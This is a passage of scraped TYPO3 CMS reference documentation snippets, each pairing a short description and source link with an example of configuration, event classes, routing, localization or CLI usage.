bash\nCODE:\n```\nvendor/bin/typo3\n```\n\n----------------------------------------\n\nTITLE: Configuring InMemoryTransport for Testing in TYPO3\nDESCRIPTION: YAML configuration to register an InMemoryTransport for testing purposes. This creates a transient message transport that only exists in memory during the test execution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  messenger.transport.in_memory:\n    class: 'Symfony\\Component\\Messenger\\Transport\\InMemory\\InMemoryTransport'\n    tags:\n      - name: 'message.sender'\n        identifier: 'in_memory'\n```\n\n----------------------------------------\n\nTITLE: Incorrect Acronym Naming Example in PHP\nDESCRIPTION: Shows an incorrect way of naming variables with acronyms by capitalizing the entire acronym, which is discouraged.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$someNiceHTMLCode\n```\n\n----------------------------------------\n\nTITLE: Basic Fluid Template Structure\nDESCRIPTION: Example of a basic Fluid template structure showing static text that needs to be translated\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<h3>{post.title}</h3>\n<p>By: {post.author.fullName}</p>\n<p>{post.content -> f:format.nl2br()}</p>\n\n<h3>Comments</h3>\n<f:for each=\"{post.comments}\" as=\"comment\">\n  {comment.content -> f:format.nl2br()}\n  <hr>\n</f:for>\n```\n\n----------------------------------------\n\nTITLE: Providing Autoload Configuration for TYPO3 Extensions\nDESCRIPTION: This snippet shows how to configure autoload settings for TYPO3 extensions following the PSR-4 standard. This is important for ensuring that the TYPO3 framework can properly load classes from the extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtEmconf.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$EM_CONF['extension_key']['autoload'] = array(\n    'psr-4' => array(\n        'Vendor\\\\ExtensionName\\\\' => 'Classes/',\n    ),\n);\n?>\n```\n\n----------------------------------------\n\nTITLE: Directory Structure for Custom Translation Server in TYPO3\nDESCRIPTION: This example shows the required directory structure for hosting language packages on a custom translation server. The structure follows TYPO3's convention for organizing extension translations by the first two letters of the extension key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Custom.rst#2025-04-16_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.org/typo3-packages/\n`-- <first-letter-of-extension-key>\n    `-- <second-letter-of-extension-key>\n        `-- <extension-key>-l10n\n            |-- <extension-key>-l10n-de.zip\n            |-- <extension-key>-l10n-fr.zip\n            `-- <extension-key>-l10n-it.zip\n```\n\n----------------------------------------\n\nTITLE: Defining Text Identifiers and Wrapping in TypoScript\nDESCRIPTION: This snippet demonstrates the creation of a text identifier 'lib.myIdentifier' with a default value and the application of different wrap configurations. The snippet also shows modifications to the wrapping of specific content elements, demonstrating cascading effects on the wrapping properties across different elements, such as 'tt_content.text' and 'tt_content.textpic'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorReference.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.myIdentifier = TEXT\nlib.myIdentifier {\n   value = Hello world\n   stdWrap.wrap = <p>|</p>\n}\ntt_content.text =< lib.myIdentifier\ntt_content.textpic =< lib.myIdentifier\n\n# This changes lib.myIdentifier.stdWrap.wrap *and* tt_content.text.stdWrap.wrap\nlib.myIdentifier.stdWrap.wrap = <h1>|</h1>\n# This changes only tt_content.textpic.stdWrap.wrap\ntt_content.textpic.stdWrap.wrap = <h2>|</h2>\n```\n\n----------------------------------------\n\nTITLE: TypoScript Configuration Example for Bulletlist\nDESCRIPTION: Demonstrates a complex TypoScript configuration for rendering bullet lists with various processing options and text styling\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/TypoScript/MythsFaq/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nstyles.content.bulletlist = TEXT\nstyles.content.bulletlist {\n  stdWrap.current = 1\n  stdWrap.trim = 1\n  stdWrap.if.isTrue.current = 1\n  # Copying the object \"styles.content.parseFunc\" to this position\n  stdWrap.parseFunc < styles.content.parseFunc\n  stdWrap.split {\n    token.char = 10\n    cObjNum = 1\n    1.current < .cObjNum\n    1.wrap = <li>\n  }\n  # Setting wrapping value:\n  stdWrap.textStyle.altWrap = {$styles.content.bulletlist.altWrap}\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Resources Directory Structure of EXT:tea Extension\nDESCRIPTION: Shows the organization of the Resources folder with Private (containing template files and localization) and Public (containing frontend assets) subfolders.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/DirectoryStructure.rst#2025-04-16_snippet_3\n\nLANGUAGE: none\nCODE:\n```\n$ tree /path/to/extension/tea\n├── Resources\n    ├── Private\n    |   ├── Language\n    |   ├── Layouts\n    |   ├── Partials\n    |   └── Templates\n    └── Public\n        ├── CSS\n        ├── Icons\n        ├── Images\n        └── JavaScript\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFinalSearchQueryIsExecutedEvent Class in TYPO3 CMS IndexedSearch\nDESCRIPTION: This code defines the BeforeFinalSearchQueryIsExecutedEvent class in the TYPO3 IndexedSearch extension. The event allows developers to manipulate the QueryBuilder before a search query gets executed. It includes public attributes for the queryBuilder and readonly attributes for searchWords and freeIndexUid.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/IndexedSearch/BeforeFinalSearchQueryIsExecutedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\IndexedSearch\\Event;\n\nclass BeforeFinalSearchQueryIsExecutedEvent\n{\n    public $queryBuilder;\n    \n    public readonly $searchWords;\n    \n    public readonly $freeIndexUid;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Archive Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's archive functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogArchive:\n    type: Extbase\n    extension: Blog\n    plugin: Archive\n    routes:\n      - routePath: '/'\n      - routePath: '/{date}'\n    defaultController: 'Post::listPostsByDate'\n    aspects:\n      date:\n        type: DateTimeRangeDefaultYear\n        routeFieldName: 'date'\n        range:\n          start: '-10 years'\n          end: '+10 years'\n        dateTimeFormat: 'Y-m-d'\n```\n\n----------------------------------------\n\nTITLE: Registering BeforeRecordIsAnalyzedEvent Listener in YAML\nDESCRIPTION: This YAML configuration registers the event listener in the extension's Services.yaml file, setting up dependency injection for the listener class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\EventListener\\CheckExternalLinksToLocalPagesEventListener:\n    tags:\n      - name: event.listener\n        identifier: 'examples-check-external-links-to-local-pages'\n        event: TYPO3\\CMS\\Linkvalidator\\Event\\BeforeRecordIsAnalyzedEvent\n```\n\n----------------------------------------\n\nTITLE: Common Fields in TYPO3 Database Tables\nDESCRIPTION: A list of typical fields found in TYPO3 database tables, including title, description, timestamp fields, sorting, and flags for record state like deleted and hidden.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseStructure/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\ntitle\n```\n\nLANGUAGE: sql\nCODE:\n```\ndescription\n```\n\nLANGUAGE: sql\nCODE:\n```\ncrdate\n```\n\nLANGUAGE: sql\nCODE:\n```\ntstamp\n```\n\nLANGUAGE: sql\nCODE:\n```\nsorting\n```\n\nLANGUAGE: sql\nCODE:\n```\ndeleted\n```\n\nLANGUAGE: sql\nCODE:\n```\nhidden\n```\n\nLANGUAGE: sql\nCODE:\n```\ndisabled\n```\n\n----------------------------------------\n\nTITLE: Getting Table Name in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the table name for the current record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getTableName()\n    :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Implementing TCA Ctrl Configuration for Tea Table in TYPO3\nDESCRIPTION: This snippet defines the ctrl section of the TCA configuration for a tea table. It specifies the table title, which field to use as label, and various system fields for tracking changes and metadata.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'ctrl' => [\n    'title' => 'LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea',\n    'label' => 'title',\n    'tstamp' => 'tstamp',\n    'crdate' => 'crdate',\n    'cruser_id' => 'cruser_id',\n    'versioningWS' => true,\n    'languageField' => 'sys_language_uid',\n    'transOrigPointerField' => 'l10n_parent',\n    'transOrigDiffSourceField' => 'l10n_diffsource',\n    'delete' => 'deleted',\n    'enablecolumns' => [\n        'disabled' => 'hidden',\n        'starttime' => 'starttime',\n        'endtime' => 'endtime',\n    ],\n    'searchFields' => 'title,description',\n    'iconfile' => 'EXT:tea/Resources/Public/Icons/tx_tea_domain_model_tea.svg',\n],\n```\n\n----------------------------------------\n\nTITLE: Retrieving Field TCA in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the full TCA of the currently handled field with 'type=flex' set.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getFieldTca()\n    :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Example Frontend Output in HTML\nDESCRIPTION: Shows the resulting HTML output from the Fluid template example, demonstrating how the variables are replaced and conditions are evaluated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<h4>This is your headline</h4>\n<p>This is the content of variable \"somevariable\"</p>\n```\n\n----------------------------------------\n\nTITLE: Loop Constructs in PHP\nDESCRIPTION: Outlines the correct use of for, while, and do loops in PHP, prohibiting function calls within for loop parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_15\n\nLANGUAGE: php\nCODE:\n```\n$size = count($dataArray);\nfor ($element = 0; $element < $size; $element++) {\n    // Process element here\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Sitemap Sorting in TypoScript\nDESCRIPTION: TypoScript configuration for setting up sorting field in sitemap configuration for records without a default sorting field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo {\n    config {\n        <sitemapType> {\n            sitemaps {\n                <unique key> {\n                    config {\n                        sortField = uid\n                    }\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing RecordCreationEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener class for the RecordCreationEvent. It uses the PHP attribute #[AsEventListener] for registration and creates a Coordinates object based on the field value of the coordinates field for a custom maps content type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/RecordCreationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Domain\\Event\\RecordCreationEvent;\nuse MyVendor\\MyExtension\\Domain\\Model\\Coordinates;\n\n#[AsEventListener]\nfinal class MyEventListener\n{\n    public function __invoke(RecordCreationEvent $event): void\n    {\n        if ($event->getTableName() === 'tt_content' && $event->getProperties()['CType'] === 'maps') {\n            $rawData = $event->getProperties()['coordinates'];\n            $event->setProperty('coordinates', Coordinates::fromString($rawData));\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Site Configuration Image in TYPO3 Documentation\nDESCRIPTION: This snippet uses the 'figure' directive in reStructuredText to include an image related to site handling in TYPO3. The image is located at '/Images/AutomaticScreenshots/SiteHandling/SiteHandlingCreateNewSite-1.png' and the 'with-shadow' CSS class is applied to the figure element, adding a shadow effect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/SiteHandling/SiteHandlingCreateNewSite-1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/SiteHandling/SiteHandlingCreateNewSite-1.png\n   :class: with-shadow\n\n   Autocreated site configuration\n```\n\n----------------------------------------\n\nTITLE: Referencing BeforeStdWrapFunctionsExecutedEvent in PHP\nDESCRIPTION: This code snippet shows how to reference the BeforeStdWrapFunctionsExecutedEvent class in PHP. It's part of the TYPO3\\CMS\\Frontend\\ContentObject\\Event namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/BeforeStdWrapFunctionsExecutedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\ContentObject\\Event\\BeforeStdWrapFunctionsExecutedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining AfterStdWrapFunctionsInitializedEvent Class Methods in TYPO3 CMS\nDESCRIPTION: Documents the PHP class AfterStdWrapFunctionsInitializedEvent with its methods for content manipulation and configuration access. The class provides methods to get and set content, retrieve configuration, and access the ContentObjectRenderer instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterStdWrapFunctionsInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass AfterStdWrapFunctionsInitializedEvent\n{\n    public function getContent(): ?string\n    \n    public function setContent(string $content)\n    \n    public function getConfiguration(): array\n    \n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n}\n```\n\n----------------------------------------\n\nTITLE: Fluid Layout Location (HTML)\nDESCRIPTION: Illustrates the common location for Fluid layouts within a TYPO3 extension. Layouts are often stored in the `Resources/Private/Layouts/` directory and can be included into main Fluid templates using the `<f:layout>` ViewHelper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/Layouts/SomeLayout.html\"\n```\n\n----------------------------------------\n\nTITLE: Defining GetVersionedDataEvent Class in PHP for TYPO3 CMS Workspaces\nDESCRIPTION: This code snippet defines the GetVersionedDataEvent class used in the TYPO3 CMS Workspaces module. It includes methods for accessing and modifying workspace version data, grid service, and pagination details. This class is specifically used for cleaned and prepared data with optional limits applied based on the view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Workspaces/GetVersionedDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Workspaces\\Event;\n\nclass GetVersionedDataEvent\n{\n    public function getGridService(): \\TYPO3\\CMS\\Workspaces\\Service\\GridDataService\n    {\n        // Implementation not shown\n    }\n\n    public function getData(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setData(array $data): void\n    {\n        // Implementation not shown\n    }\n\n    public function getDataArrayPart(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setDataArrayPart(array $dataArrayPart): void\n    {\n        // Implementation not shown\n    }\n\n    public function getStart(): int\n    {\n        // Implementation not shown\n    }\n\n    public function getLimit(): int\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Including Screenshot of Install Tool Language Pack Management\nDESCRIPTION: This directive includes a screenshot of the Install Tool's language pack management interface, located in the Maintenance module. It provides a visual reference for users following the translation update instructions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PostupgradeTasks/BackendTranslations.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Images/AutomaticScreenshots/AdminTools/InstallLanguagePacks.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Defining AddJavaScriptModulesEvent Class for TYPO3 Setup Module in PHP\nDESCRIPTION: This class defines an event for collecting additional JavaScript modules in the TYPO3 Setup Module. It provides methods to add JavaScript modules and retrieve the list of added modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Setup/AddJavaScriptModulesEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Setup\\Event;\n\nclass AddJavaScriptModulesEvent\n{\n    public function addJavaScriptModule(string $specifier)\n    {\n        // Implementation not provided\n    }\n\n    public function getJavaScriptModules(): array\n    {\n        // Implementation not provided\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring XML Sitemap Routing in YAML\nDESCRIPTION: YAML configuration for setting up route enhancers to map sitemap page types and parameters to readable URLs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  PageTypeSuffix:\n    type: PageType\n    map:\n      /: 0\n      sitemap.xml: 1533906435\n  Sitemap:\n    type: Simple\n    routePath: 'sitemap-type/{sitemap}'\n    aspects:\n      sitemap:\n        type: StaticValueMapper\n        map:\n          pages: pages\n          tx_news: tx_news\n          my_other_sitemap: my_other_sitemap\n```\n\n----------------------------------------\n\nTITLE: Using vlucas/phpdotenv to Parse .env File in TYPO3\nDESCRIPTION: This PHP code snippet demonstrates how to use the vlucas/phpdotenv library to parse a .env file in a TYPO3 project. It loads the environment variables from the .env file in the project root.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\nuse Dotenv\\Dotenv;\n\n$dotenv = Dotenv::createImmutable(dirname(__DIR__, 2));\n$dotenv->load();\n```\n\n----------------------------------------\n\nTITLE: Install Tool URL Path\nDESCRIPTION: The URL path to access TYPO3's Install Tool directly for administrative tasks like password resets.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/TYPO3.rst#2025-04-16_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.com/typo3/install.php\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Flexform Structure with Category Field in XML\nDESCRIPTION: This XML snippet defines a TYPO3 Flexform structure (T3DataStructure) with a root element containing a sheet title and a category field. It demonstrates how to configure a basic Flexform with a category type input.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Categoy/CategoryFlexform.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<T3DataStructure>\n    <ROOT>\n        <TCEforms>\n            <sheetTitle>aTitle</sheetTitle>\n        </TCEforms>\n        <type>array</type>\n        <el>\n            <categories>\n                <TCEforms>\n                    <config>\n                        <type>category</type>\n                    </config>\n                </TCEforms>\n            </categories>\n        </el>\n    </ROOT>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Implementing setUrl Method in ModifyUrlForCanonicalTagEvent Class\nDESCRIPTION: This method sets a new canonical URL. It takes a string parameter representing the new URL to be set.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: setUrl(string $url)\n\n        :param $url: the url\n```\n\n----------------------------------------\n\nTITLE: Creating Backend Controller with Composer\nDESCRIPTION: Command to create a new backend controller using TYPO3's Composer installation method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/BackendController.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 make:backendcontroller\n```\n\n----------------------------------------\n\nTITLE: Defining Extension Icon for TYPO3 Extensions\nDESCRIPTION: This code snippet specifies the path and naming conventions for the extension icon file in TYPO3. It sets guidelines for file formats (SVG preferred) and dimensions (minimum 16x16 pixels) for icons displayed in the extension manager.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Public/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  typo3:file:: Extension.svg\n    :scope: extension\n    :path: /Resources/Public/Icons/\n    :regex: /^.*\\/Resources\\/Public\\/Icons\\/Extension\\.(svg|png|gif)$/\n    :shortDescription: File name are reserved for the extension icon, displayed in the extension manager\n\n    Alternatives: :file:`Resources/Public/Icons/Extension.png`,\n    :file:`Resources/Public/Icons/Extension.gif`\n\n    These file names are reserved for the extension icon, which will be displayed in the extension manager.\n\n    It must be in format SVG (preferred), PNG or GIF and should have at least 16x16\n    pixels.\n```\n\n----------------------------------------\n\nTITLE: Using jQuery's document.ready Method\nDESCRIPTION: A code example showing the traditional jQuery approach for detecting when the DOM is ready for manipulation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/DocumentService.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n$(document).ready(() => {\n  // your application code\n});\n```\n\n----------------------------------------\n\nTITLE: Post-release Cache Flush Command\nDESCRIPTION: Command to flush page caches after a release deployment, typically used to clear database and frontend caches after switching to a new release.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 cache:flush --group pages\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for Impexp Events in reStructuredText\nDESCRIPTION: This snippet defines a table of contents using reStructuredText syntax. It includes all files in the current directory, showing only titles and using a glob pattern to match all files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Impexp/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: XLIFF Translation File Example\nDESCRIPTION: Example of an XLIFF translation file with placeholders for dynamic content\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_6\n\nLANGUAGE: XML\nCODE:\n```\n<trans-unit id=\"blog.list\" xml:space=\"preserve\" approved=\"yes\">\n   <source>Here is a list of %d blogs: </source>\n   <target>Eine Liste von %d Blogs ist hier: </target>\n</trans-unit>\n```\n\n----------------------------------------\n\nTITLE: Using ModifyLanguagePacksEvent in TYPO3 (PHP)\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the ModifyLanguagePacksEvent in TYPO3. The event allows customizing which extensions or language packs should be ignored during the language pack download process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Install/ModifyLanguagePacksEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Install\\EventListener;\n\nuse TYPO3\\CMS\\Install\\Service\\Event\\ModifyLanguagePacksEvent;\n\n/**\n * Modify which extensions / language packs should be downloaded from languages.typo3.org\n */\nfinal class MyEventListener\n{\n    public function __invoke(ModifyLanguagePacksEvent $event): void\n    {\n        $event->setExtensionIsIgnored('news', true);\n\n        // A typical use-case is to ignore all extension language packs\n        // that are shipped together with an extension\n        foreach ($event->getExtensionKeys() as $extensionKey) {\n            // Example:\n            if ($extensionKey === 'acme_demo') {\n                // Ignore languages packs for acme_demo extension\n                $event->setExtensionIsIgnored($extensionKey, true);\n            }\n\n            if ($extensionKey === 'fluid_styled_content') {\n                // Ignore Dutch language pack for fluid_styled_content\n                $event->setLanguagePackIsIgnored($extensionKey, 'nl', true);\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyFileReferenceControlsEvent Class in PHP\nDESCRIPTION: This code snippet defines the ModifyFileReferenceControlsEvent class, which allows modification of file reference controls. It includes methods to get and set various properties related to the file reference and its controls.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyFileReferenceControlsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class ModifyFileReferenceControlsEvent\n{\n    public function __construct(\n        private array $controls,\n        private ?int $uidlField,\n        private ?int $elementUid,\n        private array $file,\n        private ?string $title,\n        private ?string $description,\n        private ?string $downloadControlName,\n        private ?string $editControlName,\n        private ?string $replaceControlName,\n        private ?string $clearControlName,\n        private ?string $cropControlName,\n        private ?string $titleControlName,\n        private ?string $alternativeControlName,\n        private ?string $descriptionControlName,\n        private ?string $linktitleControlName,\n    ) {}\n\n    public function getControls(): array\n    {\n        return $this->controls;\n    }\n\n    public function setControls(array $controls): void\n    {\n        $this->controls = $controls;\n    }\n\n    public function getUidlField(): ?int\n    {\n        return $this->uidlField;\n    }\n\n    public function getElementUid(): ?int\n    {\n        return $this->elementUid;\n    }\n\n    public function getFile(): array\n    {\n        return $this->file;\n    }\n\n    public function getTitle(): ?string\n    {\n        return $this->title;\n    }\n\n    public function getDescription(): ?string\n    {\n        return $this->description;\n    }\n\n    public function getDownloadControlName(): ?string\n    {\n        return $this->downloadControlName;\n    }\n\n    public function getEditControlName(): ?string\n    {\n        return $this->editControlName;\n    }\n\n    public function getReplaceControlName(): ?string\n    {\n        return $this->replaceControlName;\n    }\n\n    public function getClearControlName(): ?string\n    {\n        return $this->clearControlName;\n    }\n\n    public function getCropControlName(): ?string\n    {\n        return $this->cropControlName;\n    }\n\n    public function getTitleControlName(): ?string\n    {\n        return $this->titleControlName;\n    }\n\n    public function getAlternativeControlName(): ?string\n    {\n        return $this->alternativeControlName;\n    }\n\n    public function getDescriptionControlName(): ?string\n    {\n        return $this->descriptionControlName;\n    }\n\n    public function getLinktitleControlName(): ?string\n    {\n        return $this->linktitleControlName;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TypoScript Extension Function Example\nDESCRIPTION: Example demonstrating the recommended naming convention for extension-specific modifier functions to avoid naming conflicts between extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/EvaluateModifierFunctionEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nfoo = fooValue\nfoo := extNewsSortFunction(myArgument)\n```\n\n----------------------------------------\n\nTITLE: Example HTML output from the TYPO3 custom LinkHandler\nDESCRIPTION: Sample HTML markup showing the resulting link format when using the GitHub LinkHandler. It demonstrates the custom protocol format that could be 